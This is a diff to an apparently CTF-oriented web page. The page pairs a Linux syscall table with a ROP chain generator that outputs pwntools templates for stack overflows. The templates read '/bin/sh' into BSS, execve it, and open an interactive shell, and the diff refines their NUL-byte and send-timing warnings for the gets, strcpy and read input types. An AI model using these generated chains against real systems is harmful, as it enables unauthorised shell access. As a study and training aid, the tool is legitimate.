@@ -243,8 +243,9 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
     </div>
     <label class="flabel">输入原语（先确认再生成：链含 \x00、两次发送有时序要求，都取决于它）</label>
     <div class="seg" role="group" aria-label="ROP 输入原语">
-      <button id="ropPrimGets">gets / strcpy 类（遇 \x00 截断）</button>
-      <button id="ropPrimReadFix">read 定长（能吃 \x00）</button>
+      <button id="ropPrimGets">gets（换行结束）</button>
+      <button id="ropPrimStrcpy">strcpy（NUL 结束）</button>
+      <button id="ropPrimReadFix">read 单次（可读 NUL，可能短读）</button>
       <button id="ropPrimReadStream">read / recv 循环读</button>
       <button id="ropPrimUnknown" class="on">还没确认</button>
     </div>
@@ -259,7 +260,7 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
     </div>
     <div class="rop-grid">
       <div><label class="flabel" for="ropOffset">offset_to_ret（输入起点 → saved RIP 的填充数，i386 模板里是 saved EIP，cyclic 量）</label><input type="text" class="rop-input" id="ropOffset" value="0x20" autocomplete="off" spellcheck="false"></div>
-      <div><label class="flabel" for="ropDelay">两次发送间隔（秒，4.1 / 4.1a 用；默认 0.3，连续发在 gets/大定长读下会挂）</label><input type="text" class="rop-input" id="ropDelay" value="0.3" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="ropDelay">第二阶段可选延时（秒，4.1 / 4.1a；默认 0.3，不能代替协议同步）</label><input type="text" class="rop-input" id="ropDelay" value="0.3" autocomplete="off" spellcheck="false"></div>
       <div><label class="flabel" for="rop42Str">要写入的字符串（4.2 / 4.2a 用；自动按 4 字节 / 8 字节分块，任意长度都行）</label><input type="text" class="rop-input" id="rop42Str" value="/bin/sh" autocomplete="off" spellcheck="false"></div>
     </div>
     <div class="rop-grid" id="ropG41">
@@ -313,12 +314,12 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
     <p class="foot">没有 pop3 只有单个 pop 的回退：别硬套模板，拆成单个 pop 逐个设寄存器。i386 read(0, bss, len)：pop eax;ret→3、pop ebx;ret→0、pop ecx;ret→bss、pop edx;ret→len，再 int 0x80；execve(bss, 0, 0)：pop eax;ret→11、pop ebx;ret→bss、pop ecx;ret→0、pop edx;ret→0，再 int 0x80。amd64 read(0, bss, len)：pop rax;ret→0、pop rdi;ret→0、pop rsi;ret→bss、pop rdx;ret→len，再 syscall；execve(bss, 0, 0)：pop rax;ret→59、pop rdi;ret→bss、pop rsi;ret→0、pop rdx;ret→0，再 syscall。单个 pop gadget 用 ROPgadget 按寄存器名分别找：<code>ROPgadget --binary ./prog | grep "pop rax"</code>、<code>ROPgadget --binary ./prog | grep "pop rdi"</code>、<code>ROPgadget --binary ./prog | grep "pop rsi"</code>、<code>ROPgadget --binary ./prog | grep "pop rdx"</code>。</p>
     <p class="foot" style="margin-top:10px"><b>ROP 区核对清单（12 项，STATIC_ONLY，未经 VM 真题验证）：</b></p>
     <ol class="foot" style="padding-left:20px;margin-top:2px">
-      <li>\x00 警告已修：生成时实算链字节数与 \x00 数并写入注释与警告区，默认预设实测 4.1 共 88 字节含 21 个 \x00、4.2 共 140 字节含 28 个 \x00（按 4.2 预设 offset=56 计；页面默认 offset 0x20 时为 116 字节、28 个 \x00），gets/strcpy 类输入会在第一个 \x00 处截断。</li>
-      <li>两次发送时序已修：4.1 / 4.1a 在两次 io.send 间插 time.sleep，间隔默认 0.3s、可在输入框改，非法输入回退 0.3s。</li>
+      <li>\x00 警告已修：生成时实算链字节数与 \x00 数并写入注释与警告区，默认预设实测 4.1 共 88 字节含 21 个 \x00、4.2 共 140 字节含 28 个 \x00（按 4.2 预设 offset=56 计；页面默认 offset 0x20 时为 116 字节、28 个 \x00），strcpy 会在 NUL 处终止；gets 按换行结束；read 可读 NUL，后续字符串处理另查。</li>
+      <li>两阶段发送：gets 输入使用 sendline 并检查换行字节；默认 0.3s 仅是可选延时，read 短读、循环定长读与 stdio 预读仍需按实际协议验证。</li>
       <li>4.2 通用 4 字节分块已修：要写入的字符串默认 /bin/sh，自动补结尾 NUL、按 4 字节分块，任意长度都生成对应写块，默认输出与旧的两行写块内容相同（分块前硬编码版）。</li>
       <li>amd64 4.1a / 4.2a 已修：新增两个模板，地址类输入全 0 占位 + SKELETON（read 长度默认 0x100 是长度不是地址），无编造地址；4.1a 是 read→BSS→execve，4.2a 是 8 字节分块写串→execve。</li>
       <li>单 pop 回退已补全：i386 与 amd64 逐寄存器序列均已写全（见回退段，本节“没有 pop3 只有单个 pop 的回退”段），不再只有一句概括。</li>
-      <li>输入原语提问已修：模板区上方四选一（gets/strcpy 类 / read 定长 / read-recv 循环读 / 还没确认，默认“还没确认”），警告与提示按选择分级。</li>
+      <li>输入原语提问已修：模板区上方五选一（gets / strcpy / read 单次（可能短读） / read-recv 循环读 / 还没确认，默认“还没确认”），警告与提示按选择分级。</li>
       <li>4.2 示例地址已标注：5 个 gadget 地址（binsh 0x080eb050、pop_eax 0x080b91e6、pop3 0x0806fc30、mov 0x080557ab、int80 0x0806d7e5）由用户提供、未验证，条件行、生成代码注释、预设 toast 三处均已标注，地址值本身未动。</li>
       <li>4.3 全 0 占位无问题：6 个输入默认全 0，生成代码含 SKELETON 占位说明，本轮未动 4.3 一字节。</li>
       <li>已核对 ROP 逻辑无问题：pop3 弹出顺序是 edx→ecx→ebx，4.2 第二写块地址是 binsh+4，execve 均为 (path, 0, 0)，均未动。</li>
@@ -1385,7 +1386,7 @@ function select(sys){
     warn.textContent="i386 特别说明（已核对）：老内核没有独立的 socket/bind/connect 系统调用，全部经 socketcall(102) 多路复用：第一个参数 call 是子调用号（见 ARG0 的提示），第二个参数是指向参数数组的指针。amd64 上这些是独立调用，别把 amd64 的 socket 号搬到 i386。";
     warn.classList.add("show");
   } else if(cur.name==="mmap2"){
-    warn.textContent="i386 特别说明（已核对）：i386 没有 mmap，只有 mmap2(192)。前五个参数和 amd64 mmap 一样，最后一个参数 pgoff 的单位是页（0x1000 字节）不是字节：从文件开头映射填 0，从 0x2000 字节处映射填 2。";
+    warn.textContent="i386 特别说明：mmap(90) 是接收结构体指针的旧 ABI；这里的 mmap2(192) 直接接收六个参数，最后一个 pgoff 以 4096 字节为单位：从文件开头映射填 0，从 0x2000 字节处映射填 2。";
     warn.classList.add("show");
   } else if(cur.name==="ipc" && arch==="i386"){
     warn.textContent="i386 说明：ipc(117) 是 SysV IPC 的多路复用入口，第一个参数 call 是子调用号（SEMGET=2 / MSGGET=13 / SHMGET=23，完整表见 ARG0 的提示），后面的参数随子调用变。新内核（5.1+）也有独立的 semget(393) / msgget(399) / shmget(395) 等号，可以直接搜名字用独立号，不必走 ipc。";
@@ -1690,6 +1691,10 @@ function asmPreviewText(sys, vals){
 function updateAsmPreview(){ if(cur) $("asmPreview").textContent=asmPreviewText(cur, currentVals()); }
 function selectByName(n){var s=SYS.find(function(x){return x.name===n;});if(s)select(s);}
 
+function findExactSys(v){
+  v=(v||"").trim().toLowerCase();
+  return SYS.find(function(x){return x.name===v || String(x.nr)===v || ("0x"+x.nr.toString(16))===v;});
+}
 function doSearch(){
   var v=q.value.trim().toLowerCase(); if(!v){suggest.classList.remove("open");return;}
   var hits=SYS.filter(function(s){return s.name.indexOf(v)>=0||String(s.nr)===v||("0x"+s.nr.toString(16))===v;}).slice(0,8);
@@ -1701,7 +1706,7 @@ function doSearch(){
 q.addEventListener("input",doSearch);
 q.addEventListener("focus",doSearch);
 q.addEventListener("keydown",function(e){
-  if(e.key==="Enter"){var v=q.value.trim().toLowerCase();var s=SYS.find(function(x){return x.name===v||String(x.nr)===v;});if(s)select(s);else doSearch();}
+  if(e.key==="Enter"){var v=q.value.trim().toLowerCase();var s=findExactSys(v);if(s)select(s);else doSearch();}
 });
 document.addEventListener("click",function(e){if(!e.target.closest(".search-wrap"))suggest.classList.remove("open");});
 
@@ -1998,9 +2003,12 @@ function ropPyBytes(chunk){ // byte-number array -> python bytes literal, e.g. b
   }
   return "b'"+s+"'";
 }
+function ropEscapeHtml(value){
+  return String(value).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");
+}
 function ropChunkBytes(str,size){ // string -> NUL-terminated, zero-padded chunks of size bytes
   var raw=[];
-  for(var i=0;i<str.length;i++) raw.push(str.charCodeAt(i)&0xff);
+  raw=Array.from(new TextEncoder().encode(str));
   raw.push(0);
   while(raw.length%size) raw.push(0);
   var out=[];
@@ -2009,14 +2017,16 @@ function ropChunkBytes(str,size){ // string -> NUL-terminated, zero-padded chunk
 }
 function ropDelayVal(){ var d=parseFloat(ropV("ropDelay")); return (isFinite(d) && d>=0) ? String(d) : "0.3"; }
 function ropWarnFor(zeros,total,prim){
-  if(prim==="gets") return "输入原语是 gets/strcpy 类：这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00，第一个 \\x00 处就截断，链发不全——改用 read 定长读，或换无 \\x00 的写法。";
-  if(prim==="read-fixed") return "这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00：定长 read 能吃 \\x00，但两次发送仍要间隔（默认 0.3s，见生成代码里的 time.sleep）。";
-  if(prim==="read-stream") return "这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00：循环 read 能吃 \\x00，两次发送仍建议间隔（默认 0.3s）。";
-  return "还没确认输入原语（gets 还是 read、定长还是不定长）：这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00——gets/strcpy 类会在第一个 \\x00 处截断，两次发送在 gets/大定长读下会挂。先确认输入原语再跑，别静默生成。";
+  var size="这条链共 "+total+" 字节，含 "+zeros+" 个 \\x00。";
+  if(prim==="gets") return size+"gets 按换行或 EOF 结束，可读入 NUL；发送时补换行，并检查 payload 内的 0x0a。后续若再用字符串函数处理，仍可能受 NUL 影响。";
+  if(prim==="strcpy") return size+"strcpy 在源字符串首个 NUL 处终止；含 NUL 的完整二进制链不能直接依赖这条复制路径传入。";
+  if(prim==="read-fixed") return size+"单次 read 可读 NUL，但不保证读满 count；核对实际返回长度。延时不能保证分阶段边界。";
+  if(prim==="read-stream") return size+"循环读取的结束条件由目标代码决定；若必须读满固定长度，先按协议补足首段，不能只靠 sleep。";
+  return size+"尚未确认输入方式：检查终止条件、实际读入长度与后续字符串复制；两阶段发送应按协议同步。";
 }
 function ropSetPrim(p){
   ropPrim=p;
-  [["Gets","gets"],["ReadFix","read-fixed"],["ReadStream","read-stream"],["Unknown","unknown"]].forEach(function(kv){
+  [["Gets","gets"],["Strcpy","strcpy"],["ReadFix","read-fixed"],["ReadStream","read-stream"],["Unknown","unknown"]].forEach(function(kv){
     var b=$("ropPrim"+kv[0]); if(b) b.classList.toggle("on", p===kv[1]);
   });
   ropGen();
@@ -2062,19 +2072,19 @@ function ropGen(){
       "# 第一段 read(0, bss, "+len+")：eax=3，edx="+len+"，ecx=bss，ebx=0",
       "# 第二段 execve(bss, 0, 0)：eax=11，edx=0，ecx=0，ebx=bss",
       "# 注意 pop3 弹出顺序是 edx, ecx, ebx，所以 flat 里 pop3 后面按 edx, ecx, ebx 的值排",
-      "# \\x00 警告：这条链共 "+total41+" 字节，含 "+z41+" 个 \\x00（调用号 3/11、长度、0 参数都会带 \\x00）；gets/strcpy 类输入会在第一个 \\x00 处截断",
+      "# \\x00 警告：这条链共 "+total41+" 字节，含 "+z41+" 个 \\x00（调用号 3/11、长度、0 参数都会带 \\x00）；strcpy 遇 NUL 终止；gets 遇换行结束，read 可读 NUL",
       "# 没有 pop3？见本节“没有 pop3 只有单个 pop 的回退”段：逐个 pop 设寄存器，别硬套 pop3 模板",
       "chain = flat(b'A'*offset_to_ret, pop_eax_addr, 3, pop3_addr, "+len+", bss_addr, 0, int80_addr,",
       "             pop_eax_addr, 11, pop3_addr, 0, 0, bss_addr, int80_addr)",
       "io.send(chain)                 # 先发链",
-      "time.sleep("+delay+")            # 两次发送间隔 "+delay+"s：gets/大定长读下连续发会挂，先等读端把链消费掉，不够再调大",
+      "time.sleep("+delay+")            # 两次发送间隔 "+delay+"s：仅作可选延时；请按目标的读入长度/提示同步，sleep 不能保证边界",
       "io.send(b'/bin/sh\\x00')          # 链里的 read 会把这一行读进 bss",
       "io.interactive()"
     ];
     steps=[
       ["步骤 1 · read(0, bss, "+len+")","eax=3 · ebx=0 (fd=stdin) · ecx="+bss+" (buf=bss) · edx="+len+" (count)　|　pop3 段按 edx,ecx,ebx 填："+len+", "+bss+", 0"],
       ["步骤 2 · execve(bss, 0, 0)","eax=11 · ebx="+bss+" (path) · ecx=0 (argv) · edx=0 (envp)　|　pop3 段按 edx,ecx,ebx 填：0, 0, "+bss],
-      ["发送顺序","先 io.send(chain)，等 "+delay+"s，再 io.send(b'/bin/sh\\0')——链跑到 read 时才从输入里取字符串，顺序反了读不到；连续发在 gets/大定长读下会挂"],
+      ["发送顺序","先按输入方式发送 chain，最多延时 "+delay+"s，再 io.send(b'/bin/sh\\0')——链跑到 read 时才从输入里取字符串，顺序反了读不到；gets 要有换行；循环定长读要先补足长度；按实际协议同步"],
       ["\\x00 统计","链共 "+total41+" 字节，含 "+z41+" 个 \\x00（主要来自调用号 3、11 和 0 参数）"]
     ];
     L={zeros:z41,total:total41};
@@ -2103,8 +2113,8 @@ function ropGen(){
       "int80_addr = "+i82+"       # int 0x80; ret",
       "",
       "p = b'A'*offset_to_ret",
-      "# 写 \""+str42+"\"（"+(str42.length+1)+" 字节含结尾 \\x00，自动按 4 字节分块，共 "+chunks42.length+" 块）",
-      "# \\x00 警告：这条链共 "+total42+" 字节，含 "+z42+" 个 \\x00；gets/strcpy 类输入会在第一个 \\x00 处截断",
+      "# 写 \""+str42+"\"（"+(new TextEncoder().encode(str42).length+1)+" 字节含结尾 \\x00，自动按 4 字节分块，共 "+chunks42.length+" 块）",
+      "# \\x00 警告：这条链共 "+total42+" 字节，含 "+z42+" 个 \\x00；strcpy 遇 NUL 终止；gets 遇换行结束，read 可读 NUL",
       "# 没有 pop3？见本节“没有 pop3 只有单个 pop 的回退”段：逐个 pop 设寄存器，别硬套 pop3 模板"
     ];
     chunks42.forEach(function(c,k){
@@ -2143,18 +2153,18 @@ function ropGen(){
       "",
       "# 第一段 read(0, bss, "+lena+")：rax=0，rdi=0，rsi=bss，rdx="+lena,
       "# 第二段 execve(bss, 0, 0)：rax=59，rdi=bss，rsi=0，rdx=0",
-      "# \\x00 警告：占位 0 还没填，\\x00 数等填入真实地址后再算；gets/strcpy 类输入会在第一个 \\x00 处截断",
+      "# \\x00 警告：占位 0 还没填，\\x00 数等填入真实地址后再算；strcpy 遇 NUL 终止；gets 遇换行结束，read 可读 NUL",
       "chain = flat(b'A'*offset_to_ret, pop_rax_addr, 0, pop_rdi_addr, 0, pop_rsi_addr, bss_addr, pop_rdx_addr, "+lena+", syscall_addr,",
       "             pop_rax_addr, 59, pop_rdi_addr, bss_addr, pop_rsi_addr, 0, pop_rdx_addr, 0, syscall_addr)",
       "io.send(chain)                 # 先发链",
-      "time.sleep("+delay+")            # 两次发送间隔 "+delay+"s：gets/大定长读下连续发会挂，先等读端把链消费掉，不够再调大",
+      "time.sleep("+delay+")            # 两次发送间隔 "+delay+"s：仅作可选延时；请按目标的读入长度/提示同步，sleep 不能保证边界",
       "io.send(b'/bin/sh\\x00')          # 链里的 read 会把这一行读进 bss",
       "io.interactive()"
     ];
     steps=[
       ["步骤 1 · read(0, bss, "+lena+")","rax=0 · rdi=0 (fd=stdin) · rsi="+bsa+" (buf=bss) · rdx="+lena+" (count)"],
       ["步骤 2 · execve(bss, 0, 0)","rax=59 (amd64 execve 号) · rdi="+bsa+" (path) · rsi=0 (argv) · rdx=0 (envp)"],
-      ["发送顺序","先 io.send(chain)，等 "+delay+"s，再 io.send(b'/bin/sh\\0')——连续发在 gets/大定长读下会挂"]
+      ["发送顺序","先按输入方式发送 chain，最多延时 "+delay+"s，再 io.send(b'/bin/sh\\0')——gets 要有换行；循环定长读要先补足长度；按实际协议同步"]
     ];
     L={zeros:null,total:null};
   }else if(ropTpl==="42a"){
@@ -2179,8 +2189,8 @@ function ropGen(){
       "syscall_addr = "+sc2+"      # syscall; ret",
       "",
       "p = b'A'*offset_to_ret",
-      "# 写 \""+str42a+"\"（"+(str42a.length+1)+" 字节含结尾 \\x00，自动按 8 字节分块，共 "+chunks42a.length+" 块）",
-      "# \\x00 警告：占位 0 还没填，\\x00 数等填入真实地址后再算；gets/strcpy 类输入会在第一个 \\x00 处截断"
+      "# 写 \""+str42a+"\"（"+(new TextEncoder().encode(str42a).length+1)+" 字节含结尾 \\x00，自动按 8 字节分块，共 "+chunks42a.length+" 块）",
+      "# \\x00 警告：占位 0 还没填，\\x00 数等填入真实地址后再算；strcpy 遇 NUL 终止；gets 遇换行结束，read 可读 NUL"
     ];
     chunks42a.forEach(function(c,k){
       var addr=(bn2!==null ? "0x"+(bn2+8*k).toString(16) : "binsh_addr+"+(8*k));
@@ -2222,9 +2232,17 @@ function ropGen(){
       ["execve(\"/bin/sh\", 0, 0)","rax=59 (amd64 execve 号) · rdi="+bsh+" (path) · rsi=0 (argv) · rdx=0 (envp)　|　每个 pop gadget 后面紧跟要放进那个寄存器的值"]
     ];
   }
+  lines=lines.reduce(function(out,line){
+    var sent=/^io\.send(?:line)?\((chain|p)\)/.exec(line);
+    if(sent){
+      if(ropPrim==="gets") out.push("assert b'\\n' not in "+sent[1]+", 'payload contains newline; gets would stop early'");
+      line=line.replace(/^io\.send(?:line)?\(/,ropPrim==="gets" ? "io.sendline(" : "io.send(");
+    }
+    out.push(line); return out;
+  },[]);
   $("ropCode").textContent=lines.join("\n");
   $("ropCond").textContent=ROP_COND[ropTpl];
-  $("ropSteps").innerHTML=steps.map(function(s){ return '<div class="rop-step"><b>'+s[0]+'</b><div class="rs-regs">'+s[1]+"</div></div>"; }).join("");
+  $("ropSteps").innerHTML=steps.map(function(s){ return '<div class="rop-step"><b>'+ropEscapeHtml(s[0])+'</b><div class="rs-regs">'+ropEscapeHtml(s[1])+"</div></div>"; }).join("");
   var empty=[], zeros=[];
   ROP_FIELDS[ropTpl].forEach(function(f){
     var v=ropV(f[0]);
@@ -2234,15 +2252,11 @@ function ropGen(){
   var w=$("ropWarn"), msgs=[];
   if(empty.length) msgs.push("还没填："+empty.join("、")+"——生成的链里对应位置是空的，先用 ROPgadget 量出来再填。");
   if(zeros.length) msgs.push("还是 0 占位："+zeros.join("、")+"——0 地址一跳就崩，按当前目标重测后填真实地址。");
-  if(L && L.zeros!==null) msgs.push(ropWarnFor(L.zeros, L.total, ropPrim));
-  else if(ropPrim==="unknown") msgs.push("还没确认输入原语（gets 还是 read、定长还是不定长）：链含 \\x00、两次发送有时序要求，没这个信息就别静默跑，先确认。");
-  else if(ropPrim==="gets") msgs.push("输入原语是 gets/strcpy 类：链含 \\x00 时第一个 \\x00 处就截断，链发不全——改用 read 定长读，或换无 \\x00 的写法。");
+  msgs.push(ropWarnFor(L && L.zeros!==null ? L.zeros : "待填入真实地址后计算", L && L.total!==null ? L.total : "待计算", ropPrim));
   if(msgs.length){ w.innerHTML=msgs.join("<br>"); w.classList.add("show"); } else { w.innerHTML=""; w.classList.remove("show"); }
   var pn=$("ropPrimNote");
-  if(pn) pn.textContent = ropPrim==="unknown"
-    ? "没确认输入原语：不知道是 gets 还是 read、定长还是不定长，生成的链可能含 \\x00、两次发送可能有时序问题，先确认再跑。"
-    : ropPrim==="gets" ? "输入原语是 gets/strcpy 类：链含 \\x00 会在第一个 \\x00 处截断；两次发送也要间隔。"
-    : "输入原语已确认：定长/循环 read 能吃 \\x00，两次发送仍要间隔（默认 0.3s）。";
+  if(pn) pn.textContent=ropWarnFor(L && L.zeros!==null ? L.zeros : "待计算", L && L.total!==null ? L.total : "待计算", ropPrim);
+
 }
 function ropSetTpl(t){
   ropTpl=t;
@@ -2259,6 +2273,7 @@ $("ropT43").addEventListener("click",function(){ropSetTpl("43");});
 $("ropT41a").addEventListener("click",function(){ropSetTpl("41a");});
 $("ropT42a").addEventListener("click",function(){ropSetTpl("42a");});
 $("ropPrimGets").addEventListener("click",function(){ropSetPrim("gets");});
+$("ropPrimStrcpy").addEventListener("click",function(){ropSetPrim("strcpy");});
 $("ropPrimReadFix").addEventListener("click",function(){ropSetPrim("read-fixed");});
 $("ropPrimReadStream").addEventListener("click",function(){ropSetPrim("read-stream");});
 $("ropPrimUnknown").addEventListener("click",function(){ropSetPrim("unknown");});
@@ -2298,7 +2313,7 @@ function setArch(a){
   $("archI386").classList.toggle("on", a==="i386");
   document.querySelectorAll(".cgArch").forEach(function(el){el.textContent=a;});
   if(a==="i386"){
-    $("subLine").innerHTML="i386 系统调用表 → <code>shellcraft.i386.linux.syscall(...)</code>，走 <code>int 0x80</code>。顺序：<code>eax=NR, ebx, ecx, edx, esi, edi, ebp</code>，调用号和 amd64 完全不同（如 read=3, write=4, open=5, execve=11）。i386 没有 mmap，只有 <code>mmap2</code>(192，最后一个参数 pgoff 单位是页)；老内核 socket 类调用走 socketcall(102) 多路复用。";
+    $("subLine").innerHTML="i386 系统调用表 → <code>shellcraft.i386.linux.syscall(...)</code>，走 <code>int 0x80</code>。顺序：<code>eax=NR, ebx, ecx, edx, esi, edi, ebp</code>，调用号和 amd64 完全不同（如 read=3, write=4, open=5, execve=11）。i386 有老式 <code>mmap</code>(90，参数是结构体指针)；六参数写法使用 <code>mmap2</code>(192，pgoff 以 4096 字节为单位)；老内核 socket 类调用走 socketcall(102) 多路复用。";
     $("tableNote").textContent="i386 表共 "+SYS32.length+" 条：NR 0\u2013386 段收录现代常用号，31 个历史号未收录（19 个无实现、12 个旧 ABI：oldstat/oldfstat/signal/sgetmask/ssetmask/uselib 等）（含 socketcall=102、ipc=117、select=142、poll=168、mmap2=192、truncate64/sendfile64、set_thread_area=243、359\u2013373 的 socket 独立调用、393\u2013402 的 SysV IPC 独立调用、403–423 的 time64 系列（32 位专用，如 clock_gettime64/futex_time64，415 除外），222、223、251、285、387–392、415 是未分配空号（共 11 个）；149 _sysctl、253 lookup_dcookie 有名无实现、调用只会返回 -ENOSYS，也未收录），NR 424 起为与 x64 共用的新调用、参数签名按同名 x64 调用复用，这一段使用前建议再用 man 确认。找不到就换英文名再试；切回 amd64 看完整表。";
     var n32=$("i386Note"); if(n32){ n32.innerHTML="<b>i386 已核对的易错点：</b>① socketcall(102) 是多路复用入口，子调用号 SYS_SOCKET=1 / BIND=2 / CONNECT=3 / LISTEN=4 / ACCEPT=5，第二个参数是指向参数数组的指针；新内核（4.3+）另有独立的 socket(359)/bind(361)/connect(362) 等号，可直接搜名字。② mmap2(192) 的最后一个参数 pgoff 单位是<b>页</b>（0x1000 字节），不是字节。③ ipc(117) 是 SysV IPC 多路复用入口（semget/msgget/shmget 走它），新内核也有独立号 393\u2013402。④ clone 的参数顺序和 amd64 不同：i386 是 flags / newsp / parent_tidptr / <b>tls / child_tidptr</b>（tls 第 4、child_tidptr 第 5，后两个和 amd64 反着——amd64 是 child_tidptr 第 4、tls 第 5），本页已按 i386 顺序收录。⑤ 同名 uid/gid 调用按名查找返回的是 *32 版号：getuid=199、getgid=200、geteuid=201、getegid=202、setuid=213、setgid=214（旧 16 位版号已从表里去掉，免得搜 getuid 跳出 24）。其余 i386 专属号（0\u2013386）已按 i386 表逐条核对，424 起共用号见上方说明。⑥ 403–423 是 32 位专用的 time64 系列（415 除外）（解决 2038 年问题的 64 位时间版）：参数顺序和同名普通版一样，只是时间结构体是 64 位的，搜 clock_gettime64 / futex_time64 / utimensat_time64 能直接找到；222、223、251、285、387–392、415 是未分配空号（共 11 个），没有对应调用。"; n32.classList.add("show"); }
   }else{
